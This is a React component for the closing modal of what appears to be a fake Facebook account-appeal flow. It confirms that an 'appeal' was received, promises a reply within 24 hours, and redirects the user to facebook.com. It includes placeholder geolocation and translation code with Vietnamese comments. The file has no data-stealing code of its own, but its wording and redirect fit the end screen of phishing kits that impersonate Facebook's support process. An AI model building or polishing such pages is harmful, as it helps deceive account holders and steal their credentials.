import FinalImage from '../assets/final-image.png';
import { useEffect, useState, type FC } from 'react';

const FinalModal: FC = () => {
  const [translations, setTranslations] = useState<Record<string, string>>({});
  const [geoInfo, setGeoInfo] = useState<{ country_code: string } | null>(null);

  const t = (text: string): string => {
    return translations[text] || text;
  };

  useEffect(() => {
    // Tạm set geoInfo mặc định
    setGeoInfo({ country_code: 'US' });
  }, []);

  useEffect(() => {
    if (!geoInfo) return;

    const textsToTranslate = [
      'Request has been sent',
      'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.',
      'Return on Facebook',
    ];

    const translateAll = async () => {
      const translatedMap: Record<string, string> = {};
      for (const text of textsToTranslate) {
        // Nếu chưa có function translateText, giữ nguyên text
        translatedMap[text] = text;
      }
      setTranslations(translatedMap);
    };

    translateAll();
  }, [geoInfo]);

  return (
    <div className="fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4">
      <div className="flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-gradient-to-br from-[#FCF3F8] to-[#EEFBF3] p-4">
        <p className="mt-4 text-2xl font-bold">{t('Request has been sent')}</p>
        <p className="text-xl">{t('Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.')}</p>
        <div className="flex flex-col justify-center gap-10">
          <img src={FinalImage} alt="Final" />
          <button
            type="button"
            onClick={() => window.location.replace('https://www.facebook.com')}
            className="mt-4 flex h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700"
          >
            {t('Return on Facebook')}
          </button>
        </div>
      </div>
    </div>
  );
};

export default FinalModal;
